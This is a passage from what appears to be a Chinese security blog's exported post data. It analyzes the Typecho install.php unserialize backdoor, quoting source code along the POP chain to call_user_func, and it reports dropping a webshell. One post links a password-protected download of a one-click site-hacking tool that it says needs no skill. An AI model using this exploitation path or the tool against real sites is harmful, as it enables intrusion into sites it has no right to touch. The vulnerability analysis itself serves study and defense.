alt=\"\"><br>上图可以看到我们释放webshell文件expsky.php。</p>\n<p>演示完毕，在菜刀里把expsky.php删除了，完成自宫，没干坏事。</p>\n<h1 id=\"漏洞修复方法\"><a href=\"#漏洞修复方法\" class=\"headerlink\" title=\"漏洞修复方法\"></a>漏洞修复方法</h1><p>可以先暂时删除掉根目录下掉 install.php 文件，或者也可以直接升级到最新的 Beta 版。</p>\n<p>注意在升级的时候也要覆盖 install.php 文件。</p>\n<h1 id=\"工具分享\"><a href=\"#工具分享\" class=\"headerlink\" title=\"工具分享\"></a>工具分享</h1><p>通过本工具，不需要懂技术，简单的点几下，半分钟内就可以完成网站的hack。</p>\n<p>由于工具进一步完善后可能存在潜在危害，所以不提供源码。</p>\n<p>工具下载: <a href=\"https://pan.baidu.com/s/1geYkDwf\" target=\"_blank\" rel=\"external\">百度云</a> 密码: dhvi，保证无任何后门（其他任何渠道下载的与本人无关）。</p>\n<p>最后再次声明，我开发这个工具仅为了技术研究，严禁非法使用，否则后果自负。</p>\n","categories":[],"tags":[]},{"title":"Typecho install.php 后门代码分析","url":"http://www.chabug.org/2017/11/03/typecho-install/","content":"<p>前几天的typecho爆的漏洞接二连三，我原本是想用typecho做博客的.</p>\n<p>然后吓得我赶紧换了git+hexo。今天分析下这个install.php中的后门。</p>\n<h1 id=\"恶意代码\"><a href=\"#恶意代码\" class=\"headerlink\" title=\"恶意代码\"></a>恶意代码</h1><ol>\n<li>base64解码后反序列化cookie中传入的__typecho_config参数，</li>\n<li>然后让__typecho_config作为构造参数例化一个Typecho_Db类，</li>\n<li>接着通过POP链进行代码执行。</li>\n</ol>\n<p>涉及到的文件还有类名</p>\n<p>install.php（unserialize） – &gt;  Db.php（class Typecho_Db）  – &gt;  Feed.php （class Typecho_Feed） – &gt;  Request.php （class Typecho_Request）</p>\n<h2 id=\"install-php\"><a href=\"#install-php\" class=\"headerlink\" title=\"install.php\"></a>install.php</h2><ol>\n<li>设置了正确的referer（网站url即可）</li>\n<li>加上一个任意的finish参数</li>\n<li>设置cookie中__typecho_config字段的值</li>\n</ol>\n<p>cookie中的__typecho_config得到序列化后的$config数组字符串,<br>反序列化后，再使用$config[‘adapter’]作为构造参数传入Typecho_Db的实例化过程。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'finish'</span>])) : <span class=\"meta\">?&gt;</span></div><div class=\"line\">               <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">if</span> (!@file_exists(__TYPECHO_ROOT_DIR__ . <span class=\"string\">'/config.inc.php'</span>)) : <span class=\"meta\">?&gt;</span></div><div class=\"line\">               &lt;h1 class=\"typecho-install-title\"&gt;&lt;?php _e('安装失败!'); ?&gt;&lt;/h1&gt;</div><div class=\"line\">               &lt;div class=\"typecho-install-body\"&gt;</div><div class=\"line\">                   &lt;form method=<span class=\"string\">\"post\"</span> action=<span class=\"string\">\"?config\"</span> name=<span class=\"string\">\"config\"</span>&gt;</div><div class=\"line\">                   &lt;p class=\"message error\"&gt;&lt;?php _e('您没有上传 config.inc.php 文件，请您重新安装！'); ?&gt; &lt;button class=\"btn primary\" type=\"submit\"&gt;&lt;?php _e('重新安装 »'); ?&gt;&lt;/button&gt;&lt;/p&gt;</div><div class=\"line\">                   &lt;/form&gt;</div><div class=\"line\">               &lt;/div&gt;</div><div class=\"line\">               <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">elseif</span> (!Typecho_Cookie::get(<span class=\"string\">'__typecho_config'</span>)): <span class=\"meta\">?&gt;</span></div><div class=\"line\">               &lt;h1 class=\"typecho-install-title\"&gt;&lt;?php _e('没有安装!'); ?&gt;&lt;/h1&gt;</div><div class=\"line\">               &lt;div class=\"typecho-install-body\"&gt;</div><div class=\"line\">                   &lt;form method=<span class=\"string\">\"post\"</span> action=<span class=\"string\">\"?config\"</span> name=<span class=\"string\">\"config\"</span>&gt;</div><div class=\"line\">                   &lt;p class=\"message error\"&gt;&lt;?php _e('您没有执行安装步骤，请您重新安装！'); ?&gt; &lt;button class=\"btn primary\" type=\"submit\"&gt;&lt;?php _e('重新安装 »'); ?&gt;&lt;/button&gt;&lt;/p&gt;</div><div class=\"line\">                   &lt;/form&gt;</div><div class=\"line\">               &lt;/div&gt;</div><div class=\"line\">               <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">else</span> : <span class=\"meta\">?&gt;</span></div><div class=\"line\">                   <span class=\"meta\">&lt;?php</span></div><div class=\"line\">                   $config = unserialize(base64_decode(Typecho_Cookie::get(<span class=\"string\">'__typecho_config'</span>)));</div><div class=\"line\">                   Typecho_Cookie::delete(<span class=\"string\">'__typecho_config'</span>);</div><div class=\"line\">                   $db = <span class=\"keyword\">new</span> Typecho_Db($config[<span class=\"string\">'adapter'</span>], $config[<span class=\"string\">'prefix'</span>]);</div><div class=\"line\">                   $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</div><div class=\"line\">                   Typecho_Db::set($db);</div><div class=\"line\">                   <span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure>\n<h2 id=\"Db-php\"><a href=\"#Db-php\" class=\"headerlink\" title=\"Db.php\"></a>Db.php</h2><p>$config[‘adapter’]在构造函数里面对应形参$adapterName,<br>$adapterName是Typecho_Feed类的实例，使用.字符连接就调用__toString魔术方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($adapterName, $prefix = <span class=\"string\">'typecho_'</span>)</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"comment\">/** 获取适配器名称 */</span></div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_adapterName = $adapterName;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">/** 数据库适配器 */</span></div><div class=\"line\">        $adapterName = <span class=\"string\">'Typecho_Db_Adapter_'</span> . $adapterName;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> (!call_user_func(<span class=\"keyword\">array</span>($adapterName, <span class=\"string\">'isAvailable'</span>))) &#123;</div><div class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Typecho_Db_Exception(<span class=\"string\">\"Adapter &#123;$adapterName&#125; is not available\"</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_prefix = $prefix;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">/** 初始化内部变量 */</span></div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_pool = <span class=\"keyword\">array</span>();</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_connectedPool = <span class=\"keyword\">array</span>();</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_config = <span class=\"keyword\">array</span>();</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">//实例化适配器对象</span></div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_adapter = <span class=\"keyword\">new</span> $adapterName();</div><div class=\"line\">    &#125;</div></pre></td></tr></table></figure>\n<h2 id=\"Feed-php\"><a href=\"#Feed-php\" class=\"headerlink\" title=\"Feed.php\"></a>Feed.php</h2><p><code>$this-&gt;_type</code>用来控制if语句的流程，<br>给<code>$this-&gt;_type</code> 赋值 ATOM 1.0时，<br>即可进入包含$item[‘author’]-&gt;screenName的分支，<br>$item[‘author’]这个变量是一个Typecho_Request的实例,<br>我们可以设置这个Typecho_Request实例的属性screenName是一个私有属性，<br>当访问$item[‘author’]-&gt;screenName就会调用__get方法<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span><span class=\"params\">()</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        $result = <span class=\"string\">'&lt;?xml version=\"1.0\" encoding=\"'</span> . <span class=\"keyword\">$this</span>-&gt;_charset . <span class=\"string\">'\"?&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">self</span>::RSS1 == <span class=\"keyword\">$this</span>-&gt;_type) &#123;</div><div class=\"line\">            $result .= <span class=\"string\">'&lt;rdf:RDF</span></div><div class=\"line\"><span class=\"string\">xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"</span></div><div class=\"line\"><span class=\"string\">xmlns=\"http://purl.org/rss/1.0/\"</span></div><div class=\"line\"><span class=\"string\">xmlns:dc=\"http://purl.org/dc/elements/1.1/\"&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">            $content = <span class=\"string\">''</span>;</div><div class=\"line\">            $links = <span class=\"keyword\">array</span>();</div><div class=\"line\">            $lastUpdate = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"keyword\">$this</span>-&gt;_items <span class=\"keyword\">as</span> $item) &#123;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;item rdf:about=\"'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'\"&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class=\"string\">'title'</span>]) . <span class=\"string\">'&lt;/title&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;link&gt;'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'&lt;/link&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;dc:date&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;dateFormat($item[<span class=\"string\">'date'</span>]) . <span class=\"string\">'&lt;/dc:date&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;description&gt;'</span> . strip_tags($item[<span class=\"string\">'content'</span>]) . <span class=\"string\">'&lt;/description&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($item[<span class=\"string\">'suffix'</span>])) &#123;</div><div class=\"line\">                    $content .= $item[<span class=\"string\">'suffix'</span>];</div><div class=\"line\">                &#125;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;/item&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">                $links[] = $item[<span class=\"string\">'link'</span>];</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> ($item[<span class=\"string\">'date'</span>] &gt; $lastUpdate) &#123;</div><div class=\"line\">                    $lastUpdate = $item[<span class=\"string\">'date'</span>];</div><div class=\"line\">                &#125;</div><div class=\"line\">            &#125;</div><div class=\"line\"></div><div class=\"line\">            $result .= <span class=\"string\">'&lt;channel rdf:about=\"'</span> . <span class=\"keyword\">$this</span>-&gt;_feedUrl . <span class=\"string\">'\"&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;title&gt;'</span> . htmlspecialchars(<span class=\"keyword\">$this</span>-&gt;_title) . <span class=\"string\">'&lt;/title&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;link&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;_baseUrl . <span class=\"string\">'&lt;/link&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;description&gt;'</span> . htmlspecialchars(<span class=\"keyword\">$this</span>-&gt;_subTitle) . <span class=\"string\">'&lt;/description&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;items&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;rdf:Seq&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">foreach</span> ($links <span class=\"keyword\">as</span> $link) &#123;</div><div class=\"line\">                $result .= <span class=\"string\">'&lt;rdf:li resource=\"'</span> . $link . <span class=\"string\">'\"/&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">            &#125;</div><div class=\"line\"></div><div class=\"line\">            $result .= <span class=\"string\">'&lt;/rdf:Seq&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;/items&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;/channel&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">            $result .= $content . <span class=\"string\">'&lt;/rdf:RDF&gt;'</span>;</div><div class=\"line\"></div><div class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">self</span>::RSS2 == <span class=\"keyword\">$this</span>-&gt;_type) &#123;</div><div class=\"line\">            $result .= <span class=\"string\">'&lt;rss version=\"2.0\"</span></div><div class=\"line\"><span class=\"string\">xmlns:content=\"http://purl.org/rss/1.0/modules/content/\"</span></div><div class=\"line\"><span class=\"string\">xmlns:dc=\"http://purl.org/dc/elements/1.1/\"</span></div><div class=\"line\"><span class=\"string\">xmlns:slash=\"http://purl.org/rss/1.0/modules/slash/\"</span></div><div class=\"line\"><span class=\"string\">xmlns:atom=\"http://www.w3.org/2005/Atom\"</span></div><div class=\"line\"><span class=\"string\">xmlns:wfw=\"http://wellformedweb.org/CommentAPI/\"&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;channel&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">            $content = <span class=\"string\">''</span>;</div><div class=\"line\">            $lastUpdate = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"keyword\">$this</span>-&gt;_items <span class=\"keyword\">as</span> $item) &#123;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;item&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class=\"string\">'title'</span>]) . <span class=\"string\">'&lt;/title&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;link&gt;'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'&lt;/link&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;guid&gt;'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'&lt;/guid&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;pubDate&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;dateFormat($item[<span class=\"string\">'date'</span>]) . <span class=\"string\">'&lt;/pubDate&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;dc:creator&gt;'</span> . htmlspecialchars($item[<span class=\"string\">'author'</span>]-&gt;screenName) . <span class=\"string\">'&lt;/dc:creator&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($item[<span class=\"string\">'category'</span>]) &amp;&amp; is_array($item[<span class=\"string\">'category'</span>])) &#123;</div><div class=\"line\">                    <span class=\"keyword\">foreach</span> ($item[<span class=\"string\">'category'</span>] <span class=\"keyword\">as</span> $category) &#123;</div><div class=\"line\">                        $content .= <span class=\"string\">'&lt;category&gt;&lt;![CDATA['</span> . $category[<span class=\"string\">'name'</span>] . <span class=\"string\">']]&gt;&lt;/category&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                    &#125;</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($item[<span class=\"string\">'excerpt'</span>])) &#123;</div><div class=\"line\">                    $content .= <span class=\"string\">'&lt;description&gt;&lt;![CDATA['</span> . strip_tags($item[<span class=\"string\">'excerpt'</span>]) . <span class=\"string\">']]&gt;&lt;/description&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($item[<span class=\"string\">'content'</span>])) &#123;</div><div class=\"line\">                    $content .= <span class=\"string\">'&lt;content:encoded xml:lang=\"'</span> . <span class=\"keyword\">$this</span>-&gt;_lang . <span class=\"string\">'\"&gt;&lt;![CDATA['</span></div><div class=\"line\">                    . <span class=\"keyword\">self</span>::EOL .</div><div class=\"line\">                    $item[<span class=\"string\">'content'</span>] . <span class=\"keyword\">self</span>::EOL .</div><div class=\"line\">                    <span class=\"string\">']]&gt;&lt;/content:encoded&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($item[<span class=\"string\">'comments'</span>]) &amp;&amp; strlen($item[<span class=\"string\">'comments'</span>]) &gt; <span class=\"number\">0</span>) &#123;</div><div class=\"line\">                    $content .= <span class=\"string\">'&lt;slash:comments&gt;'</span> . $item[<span class=\"string\">'comments'</span>] . <span class=\"string\">'&lt;/slash:comments&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                $content .= <span class=\"string\">'&lt;comments&gt;'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'#comments&lt;/comments&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($item[<span class=\"string\">'commentsFeedUrl'</span>])) &#123;</div><div class=\"line\">                    $content .= <span class=\"string\">'&lt;wfw:commentRss&gt;'</span> . $item[<span class=\"string\">'commentsFeedUrl'</span>] . <span class=\"string\">'&lt;/wfw:commentRss&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($item[<span class=\"string\">'suffix'</span>])) &#123;</div><div class=\"line\">                    $content .= $item[<span class=\"string\">'suffix'</span>];</div><div class=\"line\">                &#125;</div><div class=\"line\"></div><div class=\"line\">                $content .= <span class=\"string\">'&lt;/item&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">                <span class=\"keyword\">if</span> ($item[<span class=\"string\">'date'</span>] &gt; $lastUpdate) &#123;</div><div class=\"line\">                    $lastUpdate = $item[<span class=\"string\">'date'</span>];</div><div class=\"line\">                &#125;</div><div class=\"line\">            &#125;</div><div class=\"line\"></div><div class=\"line\">            $result .= <span class=\"string\">'&lt;title&gt;'</span> . htmlspecialchars(<span class=\"keyword\">$this</span>-&gt;_title) . <span class=\"string\">'&lt;/title&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;link&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;_baseUrl . <span class=\"string\">'&lt;/link&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;atom:link href=\"'</span> . <span class=\"keyword\">$this</span>-&gt;_feedUrl . <span class=\"string\">'\" rel=\"self\" type=\"application/rss+xml\" /&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;language&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;_lang . <span class=\"string\">'&lt;/language&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;description&gt;'</span> . htmlspecialchars(<span class=\"keyword\">$this</span>-&gt;_subTitle) . <span class=\"string\">'&lt;/description&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;lastBuildDate&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;dateFormat($lastUpdate) . <span class=\"string\">'&lt;/lastBuildDate&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;pubDate&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;dateFormat($lastUpdate) . <span class=\"string\">'&lt;/pubDate&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">            $result .= $content . <span class=\"string\">'&lt;/channel&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;/rss&gt;'</span>;</div><div class=\"line\"></div><div class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">self</span>::ATOM1 == <span class=\"keyword\">$this</span>-&gt;_type) &#123;</div><div class=\"line\">            $result .= <span class=\"string\">'&lt;feed xmlns=\"http://www.w3.org/2005/Atom\"</span></div><div class=\"line\"><span class=\"string\">xmlns:thr=\"http://purl.org/syndication/thread/1.0\"</span></div><div class=\"line\"><span class=\"string\">xml:lang=\"'</span> . <span class=\"keyword\">$this</span>-&gt;_lang . <span class=\"string\">'\"</span></div><div class=\"line\"><span class=\"string\">xml:base=\"'</span> . <span class=\"keyword\">$this</span>-&gt;_baseUrl . <span class=\"string\">'\"</span></div><div class=\"line\"><span class=\"string\">&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\"></div><div class=\"line\">            $content = <span class=\"string\">''</span>;</div><div class=\"line\">            $lastUpdate = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"keyword\">$this</span>-&gt;_items <span class=\"keyword\">as</span> $item) &#123;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;entry&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;title type=\"html\"&gt;&lt;![CDATA['</span> . $item[<span class=\"string\">'title'</span>] . <span class=\"string\">']]&gt;&lt;/title&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;link rel=\"alternate\" type=\"text/html\" href=\"'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'\" /&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;id&gt;'</span> . $item[<span class=\"string\">'link'</span>] . <span class=\"string\">'&lt;/id&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;updated&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;dateFormat($item[<span class=\"string\">'date'</span>]) . <span class=\"string\">'&lt;/updated&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;published&gt;'</span> . <span class=\"keyword\">$this</span>-&gt;dateFormat($item[<span class=\"string\">'date'</span>]) . <span class=\"string\">'&lt;/published&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div><div class=\"line\">                $content .= <span class=\"string\">'&lt;author&gt;</span></div><div class=\"line\"><span class=\"string\">    &lt;name&gt;'</span> . $item[<span class=\"string\">'author'</span>]-&gt;screenName . <span class=\"string\">'&lt;/name&gt;</span></div><div class=\"line\"><span class=\"string\">    &lt;uri&gt;'</span> . $item[<span class=\"string\">'author'</span>]-&gt;url . <span class=\"string\">'&lt;/uri&gt;</span></div><div class=\"line\"><span class=\"string\">&lt;/author&gt;'</span> . <span class=\"keyword\">self</span>::EOL;</div></pre></td></tr></table></figure></p>\n<h2 id=\"Request-php\"><a href=\"#Request-php\" class=\"headerlink\" title=\"Request.php\"></a>Request.php</h2><p>Typecho_Request实例调用__get魔术方法，进入get方法,最后进入_applyFilter方法<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span><span class=\"params\">($key)</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get($key);</div><div class=\"line\">    &#125;</div></pre></td></tr></table></figure></p>\n<p>$key的值是screenNamem,<br>因此<code>$this-&gt;_params</code>需要是个键为screenNamem的数组，键值为想执行的代码,<br>最终$value传进call_user_func<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div 